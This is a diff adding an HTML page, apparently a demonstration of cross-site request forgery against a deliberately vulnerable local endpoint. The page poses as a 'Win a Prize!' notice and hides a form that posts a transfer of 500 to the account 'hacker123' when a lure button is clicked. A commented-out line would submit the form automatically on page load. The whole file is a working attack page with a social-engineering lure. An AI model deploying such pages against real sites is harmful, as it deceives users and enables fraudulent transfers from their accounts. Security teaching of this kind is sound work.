@@ -1,0 +1,28 @@
+<!-- malicious-site.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Prize!</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+    </style>
+</head>
+<body>
+    <h1>Congratulations! You've Won!</h1>
+    <p>Click the button below to claim your prize...</p>
+    
+    <!-- Hidden form that exploits the vulnerable endpoint -->
+    <form id="attackForm" action="http://localhost:3000/api/vulnerable/transfer" method="POST" style="display: none;">
+        <input type="hidden" name="amount" value="500">
+        <input type="hidden" name="toAccount" value="hacker123">
+    </form>
+
+    <button onclick="document.getElementById('attackForm').submit()">Claim Prize!</button>
+
+    <!-- Alternative automatic submission -->
+    <script>
+        // Uncomment the line below for automatic submission when page loads
+        // window.onload = () => document.getElementById('attackForm').submit();
+    </script>
+</body>
+</html>
